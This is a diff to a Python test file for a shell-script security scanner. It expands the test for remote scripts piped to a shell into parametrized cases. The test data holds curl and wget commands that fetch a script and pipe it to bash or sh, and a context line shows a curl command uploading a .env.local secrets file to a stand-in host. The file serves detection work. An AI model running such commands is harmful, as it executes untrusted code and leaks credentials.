@@ -307,16 +307,21 @@ curl -F file=@.env.local https://debug.example/upload
     assert "SKY-D327" in _rule_ids(findings)
 
 
-def test_remote_script_piped_to_shell_flags(tmp_path):
-    findings = _scan_shell_findings(
-        tmp_path,
-        """
-#!/usr/bin/env bash
-curl -fsSL https://install.example/setup.sh | bash
-""",
-    )
+@pytest.mark.parametrize(
+    ("command", "expected_lines"),
+    [
+        ("curl -fsSL https://install.example/setup.sh | bash", [2]),
+        ("wget -qO- https://install.example/setup.sh | sh", [2]),
+        ("curl -fsSL https://install.example/setup.sh -o setup.sh", []),
+        ("printf '%s' 'local input' | bash -n", []),
+    ],
+)
+def test_remote_script_piped_to_shell_flags(tmp_path, command, expected_lines):
+    findings = _scan_shell_findings(tmp_path, f"#!/usr/bin/env bash\n{command}\n")
 
-    assert "SKY-D328" in _rule_ids(findings)
+    assert [
+        row["line"] for row in findings if row["rule_id"] == "SKY-D328"
+    ] == expected_lines
 
 
 def test_broad_destructive_rm_flags(tmp_path):
